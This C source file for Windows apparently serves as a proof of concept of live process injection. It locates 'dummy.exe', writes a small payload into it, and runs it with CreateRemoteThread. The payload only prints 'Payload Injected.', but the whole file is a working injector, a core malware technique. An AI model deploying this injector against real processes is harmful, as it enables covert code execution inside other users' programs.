/**
 * Created by:          VPR
 * Created:             June 22nd, 2023
 *
 * Updated by:          VPR
 * Updated:             June 23rd, 2023
 *
 * Description          Live process injection using CreateRemoteThread and some  
 *                      simple known lib position tech to create shellcode payloads.
**/

#include <windows.h>
#include <tlhelp32.h>

static LPCSTR const target = "dummy.exe";

typedef LPVOID (WINAPI * GetProcAddress_t)(HANDLE, LPCSTR);
typedef LPVOID (WINAPI * LoadLibraryA_t)(LPCSTR);
typedef VOID (WINAPI * puts_t)(LPCSTR);

typedef struct _Params {
    LoadLibraryA_t fLoadLibraryA;
    GetProcAddress_t fGetProcAddress;
} Params, *LPParams; 

void payload(LPParams params)
{
    CHAR szMsvcrt[] = "msvcrt.dll";
    HANDLE hMsvcrtDll = params->fLoadLibraryA(szMsvcrt);
    if (!hMsvcrtDll)
    {
        return;
    }

    CHAR szPuts[] = "puts";
    puts_t fPuts = (puts_t)params->fGetProcAddress(hMsvcrtDll, szPuts);
    if (!fPuts)
    {
        return;
    }

    CHAR szMessage[] = "Payload Injected.";
    fPuts(szMessage);
}

DWORD GetProcessIdByProcessName(LPCSTR const restrict process_name)
{
    PROCESSENTRY32 process_entry = { 0 };
    process_entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE processes_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(processes_snapshot, &process_entry))
    {
        do
        {
            if (!strcmp(process_entry.szExeFile, process_name))
            {
                CloseHandle(processes_snapshot);
                return process_entry.th32ProcessID;
            }
        } while (Process32Next(processes_snapshot, &process_entry));
    }

    CloseHandle(processes_snapshot);
    return 0;
}

int main(void)
{
    DWORD dwProcessId = 0;
    if (!(dwProcessId = GetProcessIdByProcessName(target)))
    {
        return 1;
    }

    HANDLE hProcess = NULL;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcessId);
    if (!hProcess)
    {
        return 2;
    }

    Params p = {
        .fLoadLibraryA = (LoadLibraryA_t)(GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA")),
        .fGetProcAddress = (GetProcAddress_t)(GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress"))
    };

    const UINT_PTR payload_size = (UINT_PTR)GetProcessIdByProcessName - (UINT_PTR)payload;
    LPVOID lpPayload = VirtualAllocEx(hProcess, NULL, payload_size+sizeof(p), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpPayload)
    {
        CloseHandle(hProcess);
        return 3;
    }

    SIZE_T sztBytes = 0;
    if (!WriteProcessMemory(hProcess, lpPayload, (LPCVOID)payload, payload_size, &sztBytes) || sztBytes != payload_size)
    {
        VirtualFreeEx(hProcess, lpPayload, payload_size, MEM_RELEASE);
        CloseHandle(hProcess);
        return 4;
    }

    sztBytes = 0;
    if (!WriteProcessMemory(hProcess, (LPVOID)((UINT_PTR)lpPayload+payload_size), (LPCVOID)&p, sizeof(p), &sztBytes) || sztBytes != sizeof(p))
    {
        CloseHandle(hProcess);
        return 6;
    }

    HANDLE hPayload = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpPayload, (LPVOID)((UINT_PTR)lpPayload+payload_size), 0, NULL);
    if (!hPayload)
    {
        VirtualFreeEx(hProcess, lpPayload, payload_size, MEM_RELEASE);
        CloseHandle(hProcess);
        return 7;
    }

    WaitForSingleObjectEx(hPayload, INFINITE, TRUE);
    VirtualFreeEx(hProcess, lpPayload, payload_size, MEM_RELEASE);

    CloseHandle(hProcess);
    CloseHandle(hPayload);

    return 0;
}
